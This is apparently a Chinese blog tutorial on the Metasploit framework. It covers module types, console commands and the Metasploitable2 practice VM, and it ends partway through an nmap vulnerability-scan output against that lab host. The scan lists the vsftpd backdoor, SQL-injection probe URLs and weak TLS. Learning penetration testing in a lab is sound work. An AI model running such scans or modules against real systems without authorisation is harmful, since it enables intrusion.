---
title: "MSF&CS介绍与使用"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# MSF&CS介绍与使用

免责声明：本文所有内容仅供学习交流，请勿用于违法活动

## Metasploit Framework（MSF）

Metasploit是ruby语言开发的一个基于命令行操作的渗透测试框架，我们可以查找，利用和验证漏洞，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程

### 一、msf体系框架

msf的整体框架如下：

![image-20240622182327633](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240622182328954-2109577301.png)

我们重点关注模块部分

模块组织按照不同的用途分为7种类型的模块（Modules）：

* 辅助模块（Aux)：负责信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能
* 渗透攻击模块（Exploits)：利用系统漏洞进行攻击，里面有每一个具体漏洞的攻击方法
* 后渗透攻击模块（Post)：在取得目标系统远程控制权限后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作
* 攻击载荷模块（payloads)：成功exploit之后，真正在目标系统执行的代码或指令
* 编码器模块（Encoders)：主要对payload进行加密，最终达到躲避AntiVirus检查的目的
* 空指令模块（Nops)：主要作用是提高payload稳定性及维持大小
* 免杀模块(Evasion)：可以用来创建木马文件

### 二、Metasploit基本使用

kali中自带了msf，可以直接使用

#### Metasploit启动

msf有一个用于存储信息收集数据的关系型数据库Postgresql，可以自主选择是否开启

msf有三种启动方式：

* 先启动Postgresql数据库，再启动Metasploit

  ~~~shell
  service postgresql start
  
  msfconsole
  ~~~

* 不启动数据库，直接启动Metasploit

  ~~~shell
  msfconsole
  ~~~

* 启动Postgresql的同时启动Metasploit

  ~~~shell
  msfdb run
  ~~~

* 也可以直接在kali左上角工具点击启动，实际上是自动执行了命令：

  ~~~shell
  sudo msfdb init && msfconsole
  ~~~

由于Postgresql数据库的默认端口为5432，所以可以查看该端口来判断是否开启Postgresql数据库：

~~~shell
netstat -pantu | grep 5432
~~~

#### Metasploit常用命令

在msfconsole中，输入help可以看见各种命令的介绍

##### show展示

用于展示可用模块，有效参数是：all，encoders，nops，exploits，payloads，auxiliary, post，plugins，info，options

展示模块时，每个模块都会有一个名为**Rank**的字段，该列代表该模块的可靠性

Rank 的值可以是下面的表格中的其中之一，按照可靠性降序排列

| Ranking              | Description                                                  |
| :------------------- | :----------------------------------------------------------- |
| **ExcellentRanking** | 漏洞利用程序绝对不会使目标服务崩溃，就像 SQL 注入，命令执行，远程文件包含，本地文件包含等等。**除非有特殊情况，典型的内存破坏利用程序不可以被评估为该级别**。（[WMF Escape()](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ms06_001_wmf_setabortproc.rb)） |
| **GreatRanking**     | 该漏洞利用程序有一个默认的目标系统，并且可以自动检测适当的目标系统，或者在目标服务的版本检查之后可以返回到一个特定于应用的返回地址。（译者注：有些二进制的漏洞利用成功后，需要特别设置 Shell 退出后的返回地址，否则当 Shell 结束后，目标服务器会崩溃掉。） |
| **GoodRanking**      | 该漏洞利用程序有一个默认目标系统，并且是这种类型软件的“常见情况”（英文，桌面应用程序的Windows 7，服务器的2012等常用） |
| **NormalRanking**    | 该漏洞利用程序是可靠的，但是依赖于特定的版本，并且不能或者不能可靠地自动检测。 |
| **AverageRanking**   | 该漏洞利用程序不可靠或者难以利用。                           |
| **LowRanking**       | 对于通用的平台而言，该漏洞利用程序几乎不能利用（或者低于 50% 的利用成功率） |
| **ManualRanking**    | 该漏洞利用程序不稳定或者难以利用并且基于拒绝服务（DOS）。如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到，那么也可以评为该等级。（例如：[exploit/unix/webapp/php_eval](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/php_eval.rb)） |

##### search搜索

已知一个漏洞，我想知道Metasploit里面是否有相关的模块，就可以用search进行搜索

直接执行`search [要查找的内容]`（大小写不敏感），查得很广泛，可以根据名字、路径、平台、类型、联合查询，例如:

~~~shell
#根据名字
search name:mysql 

#根据路径
search path:mysql

#根据平台
search platform:windows

#根据类型
search type:exploit

#联合查询
search name:mysql type:exploit rank:excellent
~~~

##### use使用

通过search找到了目标模块后，用`use [序号]`或`use [全名]`使用具体模块

在use了具体模块之后，有如下常用命令：

* **back：**退出当前调用的模块
* **info：**显示模块相关信息
* **show missing：**展示必填的选项
* **show options：**展示所有选项
* **show targets：**展示可攻击目标
* **show payload：**展示攻击载荷
* **set：**用于设置选项中的参数
* **unset：**取消设置参数
* **exploit/run：**配置好选项参数之后发起攻击（两者的参数规则略有区别）

### 三、Metasploit攻击流程

基本攻击流程如下图：

![image-20240623182853601](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240623182855297-1646523478.png)

### 四、Metasploitable2-Linux靶机

Metasploitable2虚拟系统是一个特别制作的ubuntu操作系统，本身设计目的是作为安全工具测试和演示常见漏洞攻击的环境。其中最重要的是可以用来作为MSF攻击用的靶机

靶机开放了很多的高危端口如21、23、445等，而且具有很多未打补丁的高危漏洞， 如Samba MS-RPC Shell命令注入漏洞等，而且对外开放了很多服务，并且数据库允许外联等。系统中的用户口令均为弱口令。系统搭载了DVWA、Mutillidae等Web漏洞演练平台

登录默认账号密码为`msfadmin:msfadmin`

#### 简单体验

配置好靶机环境后，进行信息收集

* nmap进行端口扫描：

  ~~~shell
  ┌──(root㉿kali)-[/home/kali/桌面]
  └─# nmap -sT 192.168.111.136
  Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-23 06:46 EDT
  Nmap scan report for 192.168.111.136
  Host is up (0.0013s latency).
  Not shown: 977 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  21/tcp   open  ftp
  22/tcp   open  ssh
  23/tcp   open  telnet
  25/tcp   open  smtp
  53/tcp   open  domain
  80/tcp   open  http
  111/tcp  open  rpcbind
  139/tcp  open  netbios-ssn
  445/tcp  open  microsoft-ds
  512/tcp  open  exec
  513/tcp  open  login
  514/tcp  open  shell
  1099/tcp open  rmiregistry
  1524/tcp open  ingreslock
  2049/tcp open  nfs
  2121/tcp open  ccproxy-ftp
  3306/tcp open  mysql
  5432/tcp open  postgresql
  5900/tcp open  vnc
  6000/tcp open  X11
  6667/tcp open  irc
  8009/tcp open  ajp13
  8180/tcp open  unknown
  MAC Address: 00:0C:29:3B:4C:26 (VMware)
  ~~~

* 端口服务版本探测：

  ~~~shell
  ┌──(root㉿kali)-[/home/kali/桌面]
  └─# nmap -sV -p 1-65535 192.168.111.136
  Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-23 06:47 EDT
  Nmap scan report for 192.168.111.136
  Host is up (0.00066s latency).
  Not shown: 65505 closed tcp ports (reset)
  PORT      STATE SERVICE     VERSION
  21/tcp    open  ftp         vsftpd 2.3.4
  22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
  23/tcp    open  telnet      Linux telnetd
  25/tcp    open  smtp        Postfix smtpd
  53/tcp    open  domain      ISC BIND 9.4.2
  80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
  111/tcp   open  rpcbind     2 (RPC #100000)
  139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  512/tcp   open  exec        netkit-rsh rexecd
  513/tcp   open  login?
  514/tcp   open  tcpwrapped
  1099/tcp  open  java-rmi    GNU Classpath grmiregistry
  1524/tcp  open  bindshell   Metasploitable root shell
  2049/tcp  open  nfs         2-4 (RPC #100003)
  2121/tcp  open  ftp         ProFTPD 1.3.1
  3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
  3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
  5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
  5900/tcp  open  vnc         VNC (protocol 3.3)
  6000/tcp  open  X11         (access denied)
  6667/tcp  open  irc         UnrealIRCd
  6697/tcp  open  irc         UnrealIRCd
  8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
  8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
  8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
  38340/tcp open  mountd      1-3 (RPC #100005)
  43194/tcp open  nlockmgr    1-4 (RPC #100021)
  45036/tcp open  status      1 (RPC #100024)
  50911/tcp open  java-rmi    GNU Classpath grmiregistry
  MAC Address: 00:0C:29:3B:4C:26 (VMware)
  Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 139.73 seconds
  ~~~

  接下来可以通过探测到的数据进行分析/搜索，对可能存在漏洞的地方进行测试

* 也可以直接使用nmap对主机或网段扫描是否存在常见的漏洞：

  ~~~shell
  ┌──(root㉿kali)-[/home/kali/桌面]
  └─# nmap --script=vuln 192.168.111.136
  Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-11 08:46 EDT
  Host is up (0.0031s latency).
  Not shown: 977 closed tcp ports (reset)
  PORT     STATE SERVICE
  21/tcp   open  ftp
  | ftp-vsftpd-backdoor: 
  |   VULNERABLE:
  |   vsFTPd version 2.3.4 backdoor
  |     State: VULNERABLE (Exploitable)
  |     IDs:  CVE:CVE-2011-2523  BID:48539
  |       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
  |     Disclosure date: 2011-07-03
  |     Exploit results:
  |       Shell command: id
  |       Results: uid=0(root) gid=0(root)
  |     References:
  |       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
  |       https://www.securityfocus.com/bid/48539
  |       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
  22/tcp   open  ssh
  23/tcp   open  telnet
  25/tcp   open  smtp
  | smtp-vuln-cve2010-4344: 
  |_  The SMTP server is not Exim: NOT VULNERABLE
  |_sslv2-drown: ERROR: Script execution failed (use -d to debug)
  | ssl-poodle: 
  |   VULNERABLE:
  |   SSL POODLE information leak
  |     State: VULNERABLE
  |     IDs:  CVE:CVE-2014-3566  BID:70574
  |           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
  |           products, uses nondeterministic CBC padding, which makes it easier
  |           for man-in-the-middle attackers to obtain cleartext data via a
  |           padding-oracle attack, aka the "POODLE" issue.
  |     Disclosure date: 2014-10-14
  |     Check results:
  |       TLS_RSA_WITH_AES_128_CBC_SHA
  |     References:
  |       https://www.openssl.org/~bodo/ssl-poodle.pdf
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
  |       https://www.securityfocus.com/bid/70574
  |_      https://www.imperialviolet.org/2014/10/14/poodle.html
  | ssl-dh-params: 
  |   VULNERABLE:
  |   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
  |     State: VULNERABLE
  |       Transport Layer Security (TLS) services that use anonymous
  |       Diffie-Hellman key exchange only provide protection against passive
  |       eavesdropping, and are vulnerable to active man-in-the-middle attacks
  |       which could completely compromise the confidentiality and integrity
  |       of any data exchanged over the resulting session.
  |     Check results:
  |       ANONYMOUS DH GROUP 1
  |             Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA
  |             Modulus Type: Safe prime
  |             Modulus Source: postfix builtin
  |             Modulus Length: 1024
  |             Generator Length: 8
  |             Public Key Length: 1024
  |     References:
  |       https://www.ietf.org/rfc/rfc2246.txt
  |   
  |   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
  |     State: VULNERABLE
  |     IDs:  CVE:CVE-2015-4000  BID:74733
  |       The Transport Layer Security (TLS) protocol contains a flaw that is
  |       triggered when handling Diffie-Hellman key exchanges defined with
  |       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
  |       to downgrade the security of a TLS session to 512-bit export-grade
  |       cryptography, which is significantly weaker, allowing the attacker
  |       to more easily break the encryption and monitor or tamper with
  |       the encrypted stream.
  |     Disclosure date: 2015-5-19
  |     Check results:
  |       EXPORT-GRADE DH GROUP 1
  |             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
  |             Modulus Type: Safe prime
  |             Modulus Source: Unknown/Custom-generated
  |             Modulus Length: 512
  |             Generator Length: 8
  |             Public Key Length: 512
  |     References:
  |       https://www.securityfocus.com/bid/74733
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
  |       https://weakdh.org
  |   
  |   Diffie-Hellman Key Exchange Insufficient Group Strength
  |     State: VULNERABLE
  |       Transport Layer Security (TLS) services that use Diffie-Hellman groups
  |       of insufficient strength, especially those using one of a few commonly
  |       shared groups, may be susceptible to passive eavesdropping attacks.
  |     Check results:
  |       WEAK DH GROUP 1
  |             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA
  |             Modulus Type: Safe prime
  |             Modulus Source: postfix builtin
  |             Modulus Length: 1024
  |             Generator Length: 8
  |             Public Key Length: 1024
  |     References:
  |_      https://weakdh.org
  53/tcp   open  domain
  80/tcp   open  http
  | http-slowloris-check: 
  |   VULNERABLE:
  |   Slowloris DOS attack
  |     State: LIKELY VULNERABLE
  |     IDs:  CVE:CVE-2007-6750
  |       Slowloris tries to keep many connections to the target web server open and hold
  |       them open as long as possible.  It accomplishes this by opening connections to
  |       the target web server and sending a partial request. By doing so, it starves
  |       the http server's resources causing Denial Of Service.
  |       
  |     Disclosure date: 2009-09-17
  |     References:
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
  |_      http://ha.ckers.org/slowloris/
  | http-sql-injection: 
  |   Possible sqli for queries:
  |     http://192.168.111.136:80/dav/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=N%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=password-generator.php%27%20OR%20sqlspider&username=anonymous
  |     http://192.168.111.136:80/mutillidae/index.php?page=usage-instructions.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=user-info.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=pen-test-tool-lookup.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=browser-info.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=documentation%2Fhow-to-access-Mutillidae-over-Virtual-Box-network.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=home.php&do=toggle-security%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=login.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=captured-data.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=home.php&do=toggle-hints%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=dns-lookup.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=site-footer-xss-discussion.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/?page=add-to-your-blog.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=framing.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=capture-data.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=secret-administrative-pages.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=set-background-color.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=notes.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/?page=login.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=php-errors.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=documentation%2Fvulnerabilities.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=show-log.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=change-log.htm%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=add-to-your-blog.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=installation.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/?page=source-viewer.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/?page=credits.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=arbitrary-file-inclusion.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/?page=user-info.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=register.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=view-someones-blog.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=source-viewer.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/?page=text-file-viewer.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=user-poll.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=home.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=html5-storage.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=credits.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/?page=show-log.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/index.php?page=text-file-viewer.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/mutillidae/?page=view-someones-blog.php%27%20OR%20sqlspider
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8%27%20OR%20sqlspider&rev2=1.7
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8&rev2=1.7%27%20OR%20sqlspider
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10%27%20OR%20sqlspider&rev2=1.9
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10&rev2=1.9%27%20OR%20sqlspider
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9%27%20OR%20sqlspider&rev2=1.8
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9&rev2=1.8%27%20OR%20sqlspider
  |     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.9%27%20OR%20sqlspider
  |     http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10%27%20OR%20sqlspider&template=oopsrev
  |     http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10&template=oopsrev%27%20OR%20sqlspider
  |     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.8%27%20OR%20sqlspider
  |     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.7%27%20OR%20sqlspider
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10%27%20OR%20sqlspider&rev2=1.9
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.10&rev2=1.9%27%20OR%20sqlspider
  |     http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10%27%20OR%20sqlspider&template=oopsrev
  |     http://192.168.111.136:80/oops/TWiki/TWikiHistory?param1=1.10&template=oopsrev%27%20OR%20sqlspider
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9%27%20OR%20sqlspider&rev2=1.8
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.9&rev2=1.8%27%20OR%20sqlspider
  |     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.7%27%20OR%20sqlspider
  |     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.9%27%20OR%20sqlspider
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8%27%20OR%20sqlspider&rev2=1.7
  |     http://192.168.111.136:80/rdiff/TWiki/TWikiHistory?rev1=1.8&rev2=1.7%27%20OR%20sqlspider
  |     http://192.168.111.136:80/view/TWiki/TWikiHistory?rev=1.8%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=S%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=M%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=D%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.111.136:80/dav/?C=N%3BO%3DA%27%20OR%20sqlspider
  |_    http://192.168.111.136:80/dav/?C=M%3BO%3DA%27%20OR%20sqlspider
  |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
  | http-fileupload-exploiter: 
  |   
  |_    Couldn't find a file-type field.
  | http-csrf: 
  | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.111.136
  |   Found the following possible CSRF vulnerabilities: 
  |     
  |     Path: http://192.168.111.136:80/dvwa/
  |     Form id: 
  |     Form action: login.php
  |     
  |     Path: http://192.168.111.136:80/dvwa/login.php
  |     Form id: 
  |     Form action: login.php
  |     
  |     Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html
  |     Form id: 
  |     Form action: http://TWiki.org/cgi-bin/passwd/TWiki/WebHome
  |     
  |     Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html
  |     Form id: 
  |     Form action: http://TWiki.org/cgi-bin/passwd/Main/WebHome
  |     
  |     Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html
  |     Form id: 
  |     Form action: http://TWiki.org/cgi-bin/edit/TWiki/
  |     
  |     Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html
  |     Form id: 
  |     Form action: http://TWiki.org/cgi-bin/view/TWiki/TWikiSkins
  |     
  |     Path: http://192.168.111.136:80/twiki/TWikiDocumentation.html
  |     Form id: 
  |_    Form action: http://TWiki.org/cgi-bin/manage/TWiki/ManagingWebs
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  |_http-trace: TRACE is enabled
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  | http-enum: 
  |   /tikiwiki/: Tikiwiki
  |   /test/: Test page
  |   /phpinfo.php: Possible information file
  |   /phpMyAdmin/: phpMyAdmin
  |   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'
  |   /icons/: Potentially interesting folder w/ directory listing
  |_  /index/: Potentially interesting folder
  111/tcp  open  rpcbind
  139/tcp  open  netbios-ssn
  445/tcp  open  microsoft-ds
  512/tcp  open  exec
  513/tcp  open  login
  514/tcp  open  shell
  1099/tcp open  rmiregistry
  | rmi-vuln-classloader: 
  |   VULNERABLE:
  |   RMI registry default configuration remote code execution vulnerability
  |     State: VULNERABLE
  |       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
  |       
  |     References:
  |_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
  1524/tcp open  ingreslock
  2049/tcp open  nfs
  2121/tcp open  ccproxy-ftp
  3306/tcp open  mysql
  |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
  |_ssl-ccs-injection: No reply from server (TIMEOUT)
  5432/tcp open  postgresql
  | ssl-dh-params: 
  |   VULNERABLE:
  |   Diffie-Hellman Key Exchange Insufficient Group Strength
  |     State: VULNERABLE
  |       Transport Layer Security (TLS) services that use Diffie-Hellman groups
  |       of insufficient strength, especially those using one of a few commonly
  |       shared groups, may be susceptible to passive eavesdropping attacks.
  |     Check results:
  |       WEAK DH GROUP 1
  |             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA
  |             Modulus Type: Safe prime
  |             Modulus Source: Unknown/Custom-generated
  |             Modulus Length: 1024
  |             Generator Length: 8
  |             Public Key Length: 1024
  |     References:
  |_      https://weakdh.org
  | ssl-poodle: 
  |   VULNERABLE:
  |   SSL POODLE information leak
  |     State: VULNERABLE
  |     IDs:  CVE:CVE-2014-3566  BID:70574
  |           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
  |           products, uses nondeterministic CBC padding, which makes it easier
  |           for man-in-the-middle attackers to obtain cleartext data via a
  |           padding-oracle attack, aka the "POODLE" issue.
  |     Disclosure date: 2014-10-14
  |     Check results:
  |       TLS_RSA_WITH_AES_128_CBC_SHA
  |     References:
  |       https://www.openssl.org/~bodo/ssl-poodle.pdf
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
  |       https://www.securityfocus.com/bid/70574
  |_      https://www.imperialviolet.org/2014/10/14/poodle.html
  | ssl-ccs-injection: 
  |   VULNERABLE:
  |   SSL/TLS MITM vulnerability (CCS Injection)
  |     State: VULNERABLE
  |     Risk factor: High
  |       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
  |       does not properly restrict processing of ChangeCipherSpec messages,
  |       which allows man-in-the-middle attackers to trigger use of a zero
  |       length master key in certain OpenSSL-to-OpenSSL communications, and
  |       consequently hijack sessions or obtain sensitive information, via
  |       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
  |           
  |     References:
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
  |       http://www.openssl.org/news/secadv_20140605.txt
  |_      http://www.cvedetails.com/cve/2014-0224
  5900/tcp open  vnc
  6000/tcp open  X11
  6667/tcp open  irc
  |_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
  8009/tcp open  ajp13
  8180/tcp open  unknown
  | http-cookie-flags: 
  |   /admin/: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/index.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/login.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/admin.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/account.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/admin_login.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/home.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/admin-login.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/adminLogin.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/controlpanel.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/cp.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/index.jsp: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/login.jsp: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/admin.jsp: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/home.jsp: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/controlpanel.jsp: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/admin-login.jsp: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/cp.jsp: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/account.jsp: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/admin_login.jsp: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/adminLogin.jsp: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: 
  |     JSESSIONID: 
  |       httponly flag not set
  |   /admin/jscript/upload.html: 
  |     JSESSIONID: 
  |_      httponly flag not set
  | http-enum: 
  |   /admin/: Possible admin folder
  |   /admin/index.html: Possible admin folder
  |   /admin/login.html: Possible admin folder
  |   /admin/admin.html: Possible admin folder
  |   /admin/account.html: Possible admin folder
  |   /admin/admin_login.html: Possible admin folder
  |   /admin/home.html: Possible admin folder
  |   /admin/admin-login.html: Possible admin folder
  |   /admin/adminLogin.html: Possible admin folder
  |   /admin/controlpanel.html: Possible admin folder
  |   /admin/cp.html: Possible admin folder
  |   /admin/index.jsp: Possible admin folder
  |   /admin/login.jsp: Possible admin folder
  |   /admin/admin.jsp: Possible admin folder
  |   /admin/home.jsp: Possible admin folder
  |   /admin/controlpanel.jsp: Possible admin folder
  |   /admin/admin-login.jsp: Possible admin folder
  |   /admin/cp.jsp: Possible admin folder
  |   /admin/account.jsp: Possible admin folder
  |   /admin/admin_login.jsp: Possible admin folder
  |   /admin/adminLogin.jsp: Possible admin folder
  |   /manager/html/upload: Apache Tomcat (401 Unauthorized)
  |   /manager/html: Apache Tomcat (401 Unauthorized)
